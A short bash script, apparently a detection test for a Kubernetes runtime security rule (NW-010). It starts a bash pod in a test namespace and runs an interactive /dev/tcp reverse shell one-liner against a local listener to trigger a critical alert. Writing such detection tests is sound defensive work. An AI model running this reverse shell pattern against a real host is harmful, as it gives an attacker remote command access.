#!/usr/bin/env bash
# T1059/T1071 reverse shell pattern (NW-010). The connect target is a local
# throwaway listener; the point is the /dev/tcp command line, not real C2.
set -euo pipefail
NS=${NS:-nightwatch-test}
kubectl -n "$NS" run revshell-demo --restart=Never --image=bash --command -- sleep 300
kubectl -n "$NS" wait --for=condition=Ready pod/revshell-demo --timeout=60s
kubectl -n "$NS" exec revshell-demo -- bash -c 'timeout 2 bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 || true'
echo "[+] expect NW-010 CRITICAL"
